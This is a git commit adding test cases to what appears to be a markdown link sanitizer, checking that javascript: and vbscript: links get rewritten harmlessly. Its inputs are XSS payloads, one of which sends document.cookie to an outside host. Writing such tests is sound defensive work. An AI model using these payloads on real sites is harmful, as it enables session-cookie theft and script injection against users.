3ea10630bd3708d36d647406d9858cbe7ceb461d
ache <ache@ache.one>
2019-03-03 02:56:35 +0100

    Moar tests

--- __tests__/index.js
+++ __tests__/index.js
@@ -10,6 +10,9 @@ const testInfos = [
   {name: 'example', base: '[link](url)', result: '[link](/url)\n'},
   {name: 'local link', base: '[link](/url)', result: '[link](/url)\n'},
   {name: 'auto link', base: '<http://ache>', result: '<http://ache>\n'},
+  {name: 'auto link js', base: '<javascript:alert(11);//://XSS>', result: '[javascript:alert(11);//://XSS](/javascript:alert(11);//://XSS)\n'},
+  {name: 'js XSS', base: '[lol](javascript:console.log($.post("https://12z.fr/"+document.cookie)))', result: '[lol](/javascript:console.log($.post("https://12z.fr/"+document.cookie)))\n'},
+  {name: 'vbscript XSS', base: '[lol](vbscript:msgbox("XSS"))', result: '[lol](/vbscript:msgbox("XSS"))\n'},
 ];
 
 testInfos.forEach(testInfo => {
